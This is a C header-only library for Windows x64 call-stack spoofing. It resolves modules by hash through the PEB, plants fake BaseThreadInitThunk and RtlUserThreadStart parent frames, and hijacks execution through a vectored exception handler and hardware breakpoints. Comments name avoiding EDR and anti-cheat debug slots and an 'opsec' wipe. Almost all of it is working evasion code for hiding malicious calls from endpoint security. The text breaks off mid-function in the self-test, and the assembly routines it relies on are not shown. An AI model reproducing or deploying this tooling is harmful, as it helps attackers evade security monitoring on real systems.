/* cuckoo.h - v3.2 x64 call-stack spoofer (VEH + hardware breakpoint).
 *
 *   cuckoo_init();
 *   cuckoo_call(fn, nargs, ...);    nargs 0..5; arg6 collides with SlotB
 *   cuckoo_clear();
 *   cuckoo_selftest();
 *
 * Target exceptions bypass the real chain; only a VEH sees them.
 */

#ifndef CUCKOO_H_INCLUDED
#define CUCKOO_H_INCLUDED

#include <Windows.h>
#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

int   cuckoo_init(void);
void* cuckoo_call(void* fn, size_t nargs, ...);
void  cuckoo_clear(void);
int   cuckoo_selftest(void);

#ifndef CUCKOO_KERNEL32_HASH
#define CUCKOO_KERNEL32_HASH         0xbc5d4571u
#endif
#ifndef CUCKOO_NTDLL_HASH
#define CUCKOO_NTDLL_HASH            0x4f576ca1u
#endif
#ifndef CUCKOO_FAKE_PARENT_L1_SYMBOL
#define CUCKOO_FAKE_PARENT_L1_SYMBOL "BaseThreadInitThunk"
#endif
#ifndef CUCKOO_FAKE_PARENT_L2_SYMBOL
#define CUCKOO_FAKE_PARENT_L2_SYMBOL "RtlUserThreadStart"
#endif
#ifndef CUCKOO_LOG
#define CUCKOO_LOG                   0
#endif
#ifndef CUCKOO_NO_OPSEC_WIPE
#define CUCKOO_NO_OPSEC_WIPE         0
#endif

/* slot_a 0x18: planted_top = RSP+0x18, so RSP%16 == 8 at jmp.
 * slot_c must fit cu_dispatch's 0x108 alloc. */
#define CUCKOO_SLOT_A_OFFSET         0x18
#define CUCKOO_SLOT_C_CAP            0x100

#ifdef __cplusplus
}
#endif

#ifdef CUCKOO_IMPLEMENTATION

#ifdef __cplusplus
extern "C" {
#endif

#include <intrin.h>

#if CUCKOO_LOG
#  include <stdio.h>
#  define CU_LOG(...) do { fprintf(stderr, "[cuckoo] " __VA_ARGS__); } while(0)
#else
#  define CU_LOG(...) do {} while(0)
#endif

typedef struct _CU_UNICODE_STRING {
    USHORT Length, MaximumLength;
    PWSTR  Buffer;
} CU_UNICODE_STRING;

typedef struct _CU_PEB_LDR_DATA {
    DWORD       Length, Initialized;
    LPVOID      SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
    LPVOID      EntryInProgress;
} CU_PEB_LDR_DATA;

typedef struct _CU_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY        InMemoryOrderModuleList;
    LIST_ENTRY        InInitializationOrderModuleList;
    PVOID             DllBase;
    PVOID             EntryPoint;
    ULONG             SizeOfImage;
    CU_UNICODE_STRING FullDllName;
    CU_UNICODE_STRING BaseDllName;
} CU_LDR_DATA_TABLE_ENTRY;

typedef struct _CU_PEB_MIN {
    BYTE   Reserved1[2];
    BYTE   BeingDebugged;
    BYTE   Reserved2[1];
    PVOID  Reserved3[2];
    CU_PEB_LDR_DATA* Ldr;
} CU_PEB_MIN;

/* Keep in sync with CU_* EQUs in the asm. */
typedef struct _CU_SPOOFER {
    PVOID  SpoofFunctionPointer;   /* 0x00 */
    PVOID  FakeParentL1;           /* 0x08 */
    PVOID  FakeParentL2;           /* 0x10 */
    UINT64 Nargs;                  /* 0x18 */
    PVOID  Arg01;                  /* 0x20 */
    PVOID  Arg02;                  /* 0x28 */
    PVOID  Arg03;                  /* 0x30 */
    PVOID  Arg04;                  /* 0x38 */
    PVOID  Arg05;                  /* 0x40 */
    UINT64 SlotA;                  /* 0x48 */
    UINT64 SlotB;                  /* 0x50 */
    UINT64 SlotC;                  /* 0x58 */
    UINT64 SavedRsp;               /* 0x60 */
    UINT64 ReturnValue;            /* 0x68 */
    UINT64 DrSlot;                 /* 0x70 */
} CU_SPOOFER;

extern void cu_dispatch(CU_SPOOFER* s);
extern void cu_dispatch_continuation(void);

/* Module and symbol resolution. */

#define CU_FH_RND_SEED  0xDC072B8Au
#define CU_ROR8(v)      ((DWORD)((v) >> 8) | (DWORD)((v) << 24))

static DWORD cu_hash_module(const wchar_t* name, USHORT byte_length) {
    DWORD hash = CU_FH_RND_SEED;
    DWORD i = 0;
    const unsigned char* p = (const unsigned char*)name;
    while (i < (DWORD)(byte_length / 2)) {
        WORD partial = (WORD)(*(const WORD*)(p + i++) | 0x2020u);
        hash ^= (DWORD)partial + CU_ROR8(hash);
    }
    return hash;
}

static HMODULE cu_get_module_by_hash(DWORD target) {
    CU_PEB_MIN* peb = (CU_PEB_MIN*)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return NULL;
    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY* cur = head->Flink; cur && cur != head; cur = cur->Flink) {
        CU_LDR_DATA_TABLE_ENTRY* e = (CU_LDR_DATA_TABLE_ENTRY*)cur;
        if (e->BaseDllName.Buffer && e->BaseDllName.Length &&
            cu_hash_module(e->BaseDllName.Buffer, e->BaseDllName.Length) == target)
            return (HMODULE)e->DllBase;
    }
    return NULL;
}

static int cu_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (int)(unsigned char)*a - (int)(unsigned char)*b;
}

static UINT64 cu_get_symbol_address(HMODULE module, const char* name) {
    if (!module) return 0;
    UINT64 base = (UINT64)module;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* dd = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dd->VirtualAddress || !dd->Size) return 0;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + dd->VirtualAddress);
    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);
    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ordinals = (WORD*) (base + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (cu_strcmp((const char*)(base + names[i]), name) != 0) continue;
        DWORD rva = funcs[ordinals[i]];
        if (rva < dd->VirtualAddress || rva >= dd->VirtualAddress + dd->Size) {
            return base + rva;
        }
        const char* fwd = (const char*)(base + rva);
        const char* dot = fwd;
        while (*dot && *dot != '.') dot++;
        if (!*dot) return 0;
        size_t dll_len = (size_t)(dot - fwd);
        if (dll_len == 0 || dll_len > 56) return 0;

        wchar_t wname[64];
        for (size_t k = 0; k < dll_len; k++) wname[k] = (wchar_t)fwd[k];
        size_t wlen = dll_len;
        int has_dll = 0;
        if (dll_len >= 4) {
            wchar_t e0 = wname[dll_len-4], e1 = wname[dll_len-3];
            wchar_t e2 = wname[dll_len-2], e3 = wname[dll_len-1];
            if (e0 >= L'A' && e0 <= L'Z') e0 += 32;
            if (e1 >= L'A' && e1 <= L'Z') e1 += 32;
            if (e2 >= L'A' && e2 <= L'Z') e2 += 32;
            if (e3 >= L'A' && e3 <= L'Z') e3 += 32;
            if (e0 == L'.' && e1 == L'd' && e2 == L'l' && e3 == L'l') has_dll = 1;
        }
        if (!has_dll) {
            wname[wlen++] = L'.';
            wname[wlen++] = L'd';
            wname[wlen++] = L'l';
            wname[wlen++] = L'l';
        }
        DWORD h = cu_hash_module(wname, (USHORT)(wlen * 2));
        HMODULE forward_mod = cu_get_module_by_hash(h);
        if (!forward_mod) return 0;
        return cu_get_symbol_address(forward_mod, dot + 1);
    }
    return 0;
}

static void cu_zero(void* p, size_t n) {
    volatile unsigned char* q = (volatile unsigned char*)p;
    while (n--) *q++ = 0;
}

/* Unwind metadata probes. */

static int cu_read_size_of_prolog(DWORD64 fn_addr, UCHAR* out_size) {
    DWORD64 image_base = 0;
    PRUNTIME_FUNCTION rf = RtlLookupFunctionEntry(fn_addr, &image_base, NULL);
    if (!rf || !image_base) return 1;
    UCHAR* unwind = (UCHAR*)(image_base + rf->UnwindData);
    *out_size = unwind[1];
    return 0;
}

static int cu_get_unwind_delta(DWORD64 fn_addr, DWORD* out_delta) {
    DWORD64 image_base = 0;
    PRUNTIME_FUNCTION rf = RtlLookupFunctionEntry(fn_addr, &image_base, NULL);
    if (!rf || !image_base) return 1;

    LPVOID stk = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stk) return 1;
    DWORD64 fake_rsp = (DWORD64)stk + 2048;

    CONTEXT ctx;
    cu_zero(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    ctx.Rip = fn_addr;
    ctx.Rsp = fake_rsp;
    PVOID hd = NULL; DWORD64 ef = 0;
    RtlVirtualUnwind(UNW_FLAG_NHANDLER, image_base, ctx.Rip, rf, &ctx, &hd, &ef, NULL);

    *out_delta = (DWORD)(ctx.Rsp - fake_rsp);
    VirtualFree(stk, 0, MEM_RELEASE);
    return 0;
}

/* Call-site selection. */

static DWORD cu_find_post_call_offset(const BYTE* buf, DWORD size) {
    for (DWORD i = 0; i + 2 <= size; i++) {
        BYTE b0 = buf[i];
        if (b0 == 0xE8 && i + 5 <= size) return i + 5;
        if (b0 == 0xFF) {
            BYTE b1 = buf[i + 1];
            if (b1 >= 0xD0 && b1 <= 0xD7) return i + 2;
            if (b1 == 0x15 && i + 6 <= size) return i + 6;
        }
        if (b0 == 0x41 && i + 3 <= size && buf[i + 1] == 0xFF) {
            BYTE b2 = buf[i + 2];
            if (b2 >= 0xD0 && b2 <= 0xD7) return i + 3;
        }
    }
    return 0;
}

/* The byte scan can match opcodes inside immediates. Decode lengths from the
 * function start; 0 with *complete=0 means unsupported (fall back). */

static int cu_is_prefix(BYTE b) {
    switch (b) {
    case 0x26: case 0x2E: case 0x36: case 0x3E:
    case 0x64: case 0x65: case 0x66: case 0x67:
    case 0xF0: case 0xF2: case 0xF3:
        return 1;
    default:
        return 0;
    }
}

/* p = ModRM index; extra = bytes after it (SIB + displacement). */
static int cu_modrm_len(const BYTE* fn, DWORD n, DWORD p, DWORD* extra, BYTE* modrm) {
    BYTE m, sib;
    DWORD e = 0;
    int mod, rm;

    if (p >= n) return 0;
    m = fn[p];
    *modrm = m;
    mod = m >> 6;
    rm = m & 7;
    if (mod != 3) {
        if (rm == 4) {
            if (p + 1 >= n) return 0;
            sib = fn[p + 1];
            e = 1;
            if (mod == 0) {
                if ((sib & 7) == 5) e += 4;
            } else if (mod == 1) {
                e += 1;
            } else {
                e += 4;
            }
        } else if (mod == 0) {
            if (rm == 5) e = 4;         /* RIP-relative disp32 */
        } else if (mod == 1) {
            e = 1;
        } else {
            e = 4;
        }
    }
    *extra = e;
    return 1;
}

/* Offset past the first near call ending after prolog. >0: found.
 * 0 + *complete=1: no call. 0 + *complete=0: unsupported (use byte scan). */
static DWORD cu_decode_post_call_offset(const BYTE* fn, DWORD n, DWORD prolog, int* complete) {
    DWORD i = 0;
    *complete = 0;

    while (i < n) {
        DWORD start = i, p = i, extra = 0, imm = 0, end;
        BYTE op, modrm = 0;
        int rex_w = 0, opsz = 0, addrsz = 0;
        int map = 0, has_modrm = 0, is_call = 0, group3 = 0;

        for (;;) {
            BYTE b;
            if (p >= n) return 0;
            b = fn[p];
            if (b == 0x66) { opsz = 1; p++; continue; }
            if (b == 0x67) { addrsz = 1; p++; continue; }
            if (b >= 0x40 && b <= 0x4F) { rex_w = (b & 0x08) != 0; p++; continue; }
            if (cu_is_prefix(b)) { p++; continue; }
            break;
        }
        if (p - start > 14 || p >= n) return 0;

        op = fn[p++];
        if (op == 0x0F) {
            if (p >= n) return 0;
            op = fn[p++];
            if (op == 0x38) {
                map = 2;
                if (p >= n) return 0;
                op = fn[p++];
            } else if (op == 0x3A) {
                map = 3;
                if (p >= n) return 0;
                op = fn[p++];
            } else {
                map = 1;
            }
        } else if (op == 0xC4 || op == 0xC5 || op == 0x62) {
            return 0;                       /* VEX / EVEX */
        }

        if (map == 0) {
            if (op == 0x06 || op == 0x07 || op == 0x0E || op == 0x16 ||
                op == 0x17 || op == 0x1E || op == 0x1F || op == 0x27 ||
                op == 0x2F || op == 0x37 || op == 0x3F || op == 0x60 ||
                op == 0x61 || op == 0x82 || op == 0x9A || op == 0xCE ||
                op == 0xD4 || op == 0xD5 || op == 0xD6 || op == 0xEA)
                return 0;                   /* invalid in 64-bit */
            if ((op >= 0x50 && op <= 0x5F) || (op >= 0x90 && op <= 0x9F) ||
                (op >= 0xA4 && op <= 0xA7) || (op >= 0xAA && op <= 0xAF) ||
                (op >= 0x6C && op <= 0x6F) ||
                op == 0xC3 || op == 0xC9 || op == 0xCB || op == 0xCC ||
                op == 0xCF || op == 0xD7 || (op >= 0xEC && op <= 0xEF) ||
                op == 0xF1 || op == 0xF4 || op == 0xF5 ||
                (op >= 0xF8 && op <= 0xFD)) {
                /* no ModRM/imm */
            } else if (op == 0x04 || op == 0x0C || op == 0x14 || op == 0x1C ||
                       op == 0x24 || op == 0x2C || op == 0x34 || op == 0x3C ||
                       op == 0x6A || op == 0xA8 || (op >= 0xB0 && op <= 0xB7) ||
                       op == 0xCD || (op >= 0xE4 && op <= 0xE7)) {
                imm = 1;
            } else if (op == 0x05 || op == 0x0D || op == 0x15 || op == 0x1D ||
                       op == 0x25 || op == 0x2D || op == 0x35 || op == 0x3D ||
                       op == 0x68 || op == 0xA9) {
                imm = opsz ? 2 : 4;
            } else if (op >= 0xB8 && op <= 0xBF) {
                imm = rex_w ? 8 : (opsz ? 2 : 4);
            } else if (op >= 0x70 && op <= 0x7F) {
                imm = 1;
            } else if ((op >= 0xE0 && op <= 0xE3) || op == 0xEB) {
                imm = 1;
            } else if (op == 0xE8) {
                imm = 4; is_call = 1;
            } else if (op == 0xE9) {
                imm = 4;
            } else if (op == 0xA0 || op == 0xA1 || op == 0xA2 || op == 0xA3) {
                imm = addrsz ? 4 : 8;
            } else if (op == 0xC2 || op == 0xCA) {
                imm = 2;
            } else if (op == 0xC8) {
                imm = 3;
            } else if (op == 0x80 || op == 0x83 || op == 0x6B ||
                       op == 0xC0 || op == 0xC1 || op == 0xC6) {
                has_modrm = 1; imm = 1;
            } else if (op == 0x81 || op == 0x69 || op == 0xC7) {
                has_modrm = 1; imm = opsz ? 2 : 4;
            } else if (op == 0xF6 || op == 0xF7) {
                has_modrm = 1; group3 = 1;
            } else {
                has_modrm = 1;
            }
        } else if (map == 1) {
            if (op == 0x0F) return 0;       /* 3DNow! */
            if (op == 0x05 || op == 0x06 || op == 0x07 || op == 0x08 ||
                op == 0x09 || op == 0x0B || op == 0x0E ||
                (op >= 0x30 && op <= 0x35) || op == 0x37 || op == 0x77 ||
                op == 0xA0 || op == 0xA1 || op == 0xA2 || op == 0xA8 ||
                op == 0xA9 || op == 0xAA || (op >= 0xC8 && op <= 0xCF)) {
                /* no ModRM/imm */
            } else if (op >= 0x80 && op <= 0x8F) {
                imm = 4;
            } else if (op == 0x70 || op == 0x71 || op == 0x72 || op == 0x73 ||
                       op == 0xA4 || op == 0xAC || op == 0xBA || op == 0xC2 ||
                       op == 0xC4 || op == 0xC5 || op == 0xC6) {
                has_modrm = 1; imm = 1;
            } else {
                has_modrm = 1;
            }
        } else if (map == 2) {
            has_modrm = 1;
        } else {
            has_modrm = 1; imm = 1;         /* 0F 3A */
        }

        if (has_modrm) {
            if (!cu_modrm_len(fn, n, p, &extra, &modrm)) return 0;
            if (group3) {
                int reg = (modrm >> 3) & 7;
                if (reg <= 1) imm = (op == 0xF6) ? 1 : (opsz ? 2 : 4);
            }
            if (map == 0 && op == 0xFF && ((modrm >> 3) & 7) == 2)
                is_call = 1;                /* near call */
            end = p + 1 + extra + imm;
        } else {
            end = p + imm;
        }

        if (end > n || end <= start || end - start > 15) return 0;
        if (is_call && end > prolog) {
            *complete = 1;
            return end;
        }
        i = end;
    }

    *complete = 1;
    return 0;
}

/* L2 picker: unwind our own stack. */
static DWORD cu_discover_btitn_return_offset(DWORD64 btitn_addr, DWORD64 rtlu_addr) {
    DWORD64 b_ib = 0, r_ib = 0;
    PRUNTIME_FUNCTION b_rf = RtlLookupFunctionEntry(btitn_addr, &b_ib, NULL);
    PRUNTIME_FUNCTION r_rf = RtlLookupFunctionEntry(rtlu_addr,  &r_ib, NULL);
    if (!b_rf || !r_rf) return 0;
    DWORD64 b_begin = b_ib + b_rf->BeginAddress, b_end = b_ib + b_rf->EndAddress;
    DWORD64 r_begin = r_ib + r_rf->BeginAddress, r_end = r_ib + r_rf->EndAddress;

    CONTEXT ctx;
    cu_zero(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    RtlCaptureContext(&ctx);

    int saw_btitn = 0;
    for (int i = 0; i < 32 && ctx.Rip != 0; i++) {
        if (saw_btitn) {
            if (ctx.Rip >= r_begin && ctx.Rip < r_end) {
                return (DWORD)(ctx.Rip - rtlu_addr);
            }
            return 0;
        }
        if (ctx.Rip >= b_begin && ctx.Rip < b_end) saw_btitn = 1;

        DWORD64 ib = 0;
        PRUNTIME_FUNCTION rf = RtlLookupFunctionEntry(ctx.Rip, &ib, NULL);
        if (rf) {
            PVOID hd = NULL; DWORD64 ef = 0;
            RtlVirtualUnwind(UNW_FLAG_NHANDLER, ib, ctx.Rip, rf, &ctx, &hd, &ef, NULL);
        } else {
            ctx.Rip = *(DWORD64*)ctx.Rsp;
            ctx.Rsp += 8;
        }
    }
    return 0;
}

static DWORD cu_pick_post_call_or_fallback(DWORD64 fn_addr, UCHAR size_of_prolog) {
    DWORD64 image_base = 0;
    PRUNTIME_FUNCTION rf = RtlLookupFunctionEntry(fn_addr, &image_base, NULL);
    if (!rf) return (DWORD)size_of_prolog + 1;
    DWORD fn_size = rf->EndAddress - rf->BeginAddress;
    if (fn_size <= size_of_prolog) return (DWORD)size_of_prolog + 1;
    DWORD body = size_of_prolog;
    int complete = 0;
    DWORD abs_off = cu_decode_post_call_offset(
        (const BYTE*)fn_addr, fn_size, body, &complete);
    if (abs_off == 0 && !complete) {
        DWORD post;
        CU_LOG("call-site decode failed; using byte scan\n");
        post = cu_find_post_call_offset(
            (const BYTE*)fn_addr + body, fn_size - body);
        if (post) abs_off = body + post;
    }
    if (abs_off == 0 || abs_off >= fn_size)
        return (DWORD)size_of_prolog + 1;
    return abs_off;
}

/* Global state. */

static PVOID         g_cu_fake_parent_l1 = 0;
static PVOID         g_cu_fake_parent_l2 = 0;
static UINT64        g_cu_slot_a         = 0;
static UINT64        g_cu_slot_b         = 0;
static UINT64        g_cu_slot_c         = 0;
static DWORD         g_cu_tls_index      = TLS_OUT_OF_INDEXES;
static PVOID         g_cu_veh_handle     = NULL;

/* 0=uninit  1=in-progress  2=ready. */
static volatile LONG g_cu_init_state = 0;

/* Live API calls; clear() drains these before teardown. */
static volatile LONG g_cu_active  = 0;
static volatile LONG g_cu_closing = 0;

static int cu_acquire(void) {
    InterlockedIncrement(&g_cu_active);
    if (InterlockedCompareExchange(&g_cu_closing, 0, 0) != 0) {
        InterlockedDecrement(&g_cu_active);
        return 1;
    }
    return 0;
}

static void cu_release(void) { InterlockedDecrement(&g_cu_active); }

/* VEH and hardware-breakpoint arming. */

/* Lowest free DR slot; avoids EDR/anti-cheat slots. */
int cu_arm_hwbp(CU_SPOOFER* s) {
    /* TLS is non-NULL only while a call is armed on this thread. */
    DWORD last_error = GetLastError();
    PVOID held = (g_cu_tls_index != TLS_OUT_OF_INDEXES) ? TlsGetValue(g_cu_tls_index) : NULL;
    SetLastError(last_error);
    if (held) return 5;

    CONTEXT ctx;
    cu_zero(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(GetCurrentThread(), &ctx)) return 2;

    int slot = -1;
    for (int n = 0; n < 4; n++) {
        if (!(ctx.Dr7 & (1ULL << (2 * n)))) { slot = n; break; }
    }
    if (slot < 0) return 4;

    if (!TlsSetValue(g_cu_tls_index, s)) return 1;

    DWORD64* drs[4] = { &ctx.Dr0, &ctx.Dr1, &ctx.Dr2, &ctx.Dr3 };
    *drs[slot] = (DWORD64)s->FakeParentL1;

    /* Execute BP: R/W=00, LEN=00, L_n=1. */
    UINT64 mask = (3ULL << (2 * slot)) | (0xFULL << (16 + 4 * slot));
    ctx.Dr7 &= ~mask;
    ctx.Dr7 |= (1ULL << (2 * slot));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!SetThreadContext(GetCurrentThread(), &ctx)) {
        TlsSetValue(g_cu_tls_index, NULL);
        return 3;
    }

    s->DrSlot = (UINT64)slot;
    return 0;
}

/* Catch #DB at L1; pivot to cu_dispatch_continuation. */
LONG WINAPI cu_veh(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;
    if ((UINT64)ep->ExceptionRecord->ExceptionAddress != (UINT64)g_cu_fake_parent_l1)
        return EXCEPTION_CONTINUE_SEARCH;

    /* TlsGetValue clears LastError; preserve the target's value. */
    DWORD last_error = GetLastError();
    CU_SPOOFER* s = (CU_SPOOFER*)TlsGetValue(g_cu_tls_index);
    SetLastError(last_error);
    if (!s || s->DrSlot >= 4) return EXCEPTION_CONTINUE_SEARCH;

    /* Confirm hit was on our slot, not EDR's. */
    if (!(ep->ContextRecord->Dr6 & (1ULL << s->DrSlot)))
        return EXCEPTION_CONTINUE_SEARCH;

    /* Release this thread's owner; nested-call guard. */
    TlsSetValue(g_cu_tls_index, NULL);
    SetLastError(last_error);

    s->ReturnValue = (UINT64)ep->ContextRecord->Rax;

    ep->ContextRecord->Rsp = (DWORD64)s->SavedRsp;
    ep->ContextRecord->Rcx = (DWORD64)s;
    ep->ContextRecord->Rip = (DWORD64)cu_dispatch_continuation;

    /* Disarm our slot only. */
    DWORD64* drs[4] = { &ep->ContextRecord->Dr0, &ep->ContextRecord->Dr1,
                        &ep->ContextRecord->Dr2, &ep->ContextRecord->Dr3 };
    *drs[s->DrSlot] = 0;
    ep->ContextRecord->Dr6 &= ~(1ULL << s->DrSlot);
    ep->ContextRecord->Dr7 &= ~(1ULL << (2 * s->DrSlot));
    ep->ContextRecord->ContextFlags |= CONTEXT_DEBUG_REGISTERS;

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* Init, clear, call. */

static int cu_init_internal(void) {
    if (g_cu_init_state == 2) return 0;
    LONG prev = InterlockedCompareExchange(&g_cu_init_state, 1, 0);
    if (prev == 2) return 0;
    if (prev == 1) {
        while (g_cu_init_state == 1) YieldProcessor();
        return (g_cu_init_state == 2) ? 0 : 1;
    }

    int err = 1;
    __try {
    do {
        HMODULE k32   = cu_get_module_by_hash(CUCKOO_KERNEL32_HASH);
        HMODULE ntdll = cu_get_module_by_hash(CUCKOO_NTDLL_HASH);
        if (!k32 || !ntdll) { CU_LOG("kernel32/ntdll not found\n"); break; }

        UINT64 btitn = cu_get_symbol_address(k32,   CUCKOO_FAKE_PARENT_L1_SYMBOL);
        UINT64 rtlu  = cu_get_symbol_address(ntdll, CUCKOO_FAKE_PARENT_L2_SYMBOL);
        if (!btitn || !rtlu) { CU_LOG("fake-parent symbols not found\n"); break; }

        UCHAR btitn_size_prolog = 0, rtlu_size_prolog = 0;
        if (cu_read_size_of_prolog(btitn, &btitn_size_prolog) != 0) {
            CU_LOG("BTITN UNWIND_INFO not found\n"); break;
        }
        if (cu_read_size_of_prolog(rtlu, &rtlu_size_prolog) != 0) {
            CU_LOG("RtlUTS UNWIND_INFO not found\n"); break;
        }

        DWORD btitn_delta = 0, rtlu_delta = 0;
        if (cu_get_unwind_delta(btitn + btitn_size_prolog + 1, &btitn_delta) != 0 ||
            cu_get_unwind_delta(rtlu  + rtlu_size_prolog  + 1, &rtlu_delta)  != 0) {
            CU_LOG("unwind probe failed\n"); break;
        }
        DWORD btitn_prolog_total = btitn_delta - 8;
        DWORD rtlu_prolog_total  = rtlu_delta  - 8;

        /* SlotB must clear the target's shadow space and the arg5 slot. */
        if (btitn_prolog_total < 0x28) {
            CU_LOG("BTITN frame too small (0x%lx); SlotB would collide\n",
                   (unsigned long)btitn_prolog_total);
            break;
        }

        /* Slots relative to body_rsp; b/c follow each frame's prolog. */
        UINT64 slot_a = (UINT64)CUCKOO_SLOT_A_OFFSET;
        UINT64 slot_b = slot_a + 8 + btitn_prolog_total;
        UINT64 slot_c = slot_b + 8 + rtlu_prolog_total;
        if (slot_c >= CUCKOO_SLOT_C_CAP) {
            CU_LOG("BTITN+RtlUTS prologs too large (slot_c=0x%llx >= cap=0x%lx)\n",
                   (unsigned long long)slot_c, (unsigned long)CUCKOO_SLOT_C_CAP);
            break;
        }

        DWORD btitn_off = cu_pick_post_call_or_fallback(btitn, btitn_size_prolog);
        DWORD rtlu_off  = cu_discover_btitn_return_offset(btitn, rtlu);
        if (rtlu_off == 0) rtlu_off = cu_pick_post_call_or_fallback(rtlu, rtlu_size_prolog);

        if (g_cu_tls_index == TLS_OUT_OF_INDEXES) {
            g_cu_tls_index = TlsAlloc();
            if (g_cu_tls_index == TLS_OUT_OF_INDEXES) {
                CU_LOG("TlsAlloc failed\n"); break;
            }
        }
        if (!g_cu_veh_handle) {
            g_cu_veh_handle = AddVectoredExceptionHandler(1, cu_veh);
            if (!g_cu_veh_handle) {
                CU_LOG("AddVectoredExceptionHandler failed\n"); break;
            }
        }

        g_cu_fake_parent_l1 = (PVOID)(btitn + btitn_off);
        g_cu_fake_parent_l2 = (PVOID)(rtlu  + rtlu_off);
        g_cu_slot_a         = slot_a;
        g_cu_slot_b         = slot_b;
        g_cu_slot_c         = slot_c;

        CU_LOG("init ok (VEH+HWBP): "
               "L1=%p (BTITN+0x%lx) L2=%p (RtlUTS+0x%lx) "
               "btitn_prolog=0x%lx rtlu_prolog=0x%lx "
               "slot_a=0x%llx slot_b=0x%llx slot_c=0x%llx tls=%lu\n",
               g_cu_fake_parent_l1, (unsigned long)btitn_off,
               g_cu_fake_parent_l2, (unsigned long)rtlu_off,
               (unsigned long)btitn_prolog_total, (unsigned long)rtlu_prolog_total,
               (unsigned long long)slot_a, (unsigned long long)slot_b,
               (unsigned long long)slot_c, (unsigned long)g_cu_tls_index);
        err = 0;
    } while (0);
    }
    __finally {
        /* Runs on unwind too; prevents a stuck init state. */
        if (err) {
            if (g_cu_veh_handle) {
                RemoveVectoredExceptionHandler(g_cu_veh_handle);
                g_cu_veh_handle = NULL;
            }
            if (g_cu_tls_index != TLS_OUT_OF_INDEXES) {
                TlsFree(g_cu_tls_index);
                g_cu_tls_index = TLS_OUT_OF_INDEXES;
            }
            g_cu_fake_parent_l1 = 0;
            g_cu_fake_parent_l2 = 0;
            g_cu_slot_a = 0;
            g_cu_slot_b = 0;
            g_cu_slot_c = 0;
            InterlockedExchange(&g_cu_init_state, 0);
        }
    }

    if (err) return 1;
    InterlockedExchange(&g_cu_init_state, 2);
    return 0;
}

int cuckoo_init(void) {
    int r;
    if (cu_acquire()) return 1;
    __try { r = cu_init_internal(); }
    __finally { cu_release(); }
    return r;
}

void cuckoo_clear(void) {
    /* No-op inside a spoofed call on this thread; its VEH is needed. */
    if (g_cu_tls_index != TLS_OUT_OF_INDEXES) {
        DWORD last_error = GetLastError();
        PVOID held = TlsGetValue(g_cu_tls_index);
        SetLastError(last_error);
        if (held) return;
    }
    if (InterlockedCompareExchange(&g_cu_closing, 0, 0) != 0) return;
    if (InterlockedExchange(&g_cu_closing, 1) != 0) return;

    /* Drain in-flight calls; new calls fail while closing. */
    while (InterlockedCompareExchange(&g_cu_active, 0, 0) != 0) Sleep(1);

    if (g_cu_veh_handle) {
        RemoveVectoredExceptionHandler(g_cu_veh_handle);
        g_cu_veh_handle = NULL;
    }
    if (g_cu_tls_index != TLS_OUT_OF_INDEXES) {
        TlsFree(g_cu_tls_index);
        g_cu_tls_index = TLS_OUT_OF_INDEXES;
    }
    InterlockedExchange(&g_cu_init_state, 0);
    g_cu_fake_parent_l1 = 0;
    g_cu_fake_parent_l2 = 0;
    g_cu_slot_a = 0;
    g_cu_slot_b = 0;
    g_cu_slot_c = 0;

    InterlockedExchange(&g_cu_closing, 0);
}

void* cuckoo_call(void* fn, size_t nargs, ...) {
    CU_SPOOFER s;
    void* ret = NULL;
    int ok = 0;

    if (!fn || nargs > 5) return NULL;
    if (cu_acquire()) return NULL;

    cu_zero(&s, sizeof(s));
    __try {
        if (cu_init_internal() == 0) {
            s.SpoofFunctionPointer = fn;
            s.FakeParentL1         = g_cu_fake_parent_l1;
            s.FakeParentL2         = g_cu_fake_parent_l2;
            s.Nargs                = (UINT64)nargs;
            s.SlotA                = g_cu_slot_a;
            s.SlotB                = g_cu_slot_b;
            s.SlotC                = g_cu_slot_c;

            PVOID* arg_slots[5] = { &s.Arg01, &s.Arg02, &s.Arg03, &s.Arg04, &s.Arg05 };
            va_list ap;
            va_start(ap, nargs);
            for (size_t i = 0; i < nargs; i++) *arg_slots[i] = va_arg(ap, PVOID);
            va_end(ap);

            cu_dispatch(&s);
            ret = (void*)(uintptr_t)s.ReturnValue;
            ok = 1;
        }
    }
    __finally {
        cu_release();
    }

    if (!ok) return NULL;

#if !CUCKOO_NO_OPSEC_WIPE
    cu_zero(&s, sizeof(s));
#endif
    return ret;
}

int cuckoo_selftest(void) {
    if (cuckoo_init() != 0) { CU_LOG("selftest: init failed\n"); return 1; }
    HMODULE k32 = cu_get_module_by_hash(CUCKOO_KERNEL32_HASH);
    if (!k32) { CU_LOG("selftest: no kernel32\n"); return 2; }
    UINT64 fn = cu_get_symbol_address(k32, "GetCurrentProcessId");
    if (!fn) { CU_LOG("selftest: no GetCurrentProcessId\n"); return 3; }

    DWORD direct  = GetCurrentProcessId();
    DWORD spoofed = (DWORD)(uintptr_t)cuckoo_call((void*)fn, 0);
    if (direct != spoofed) {
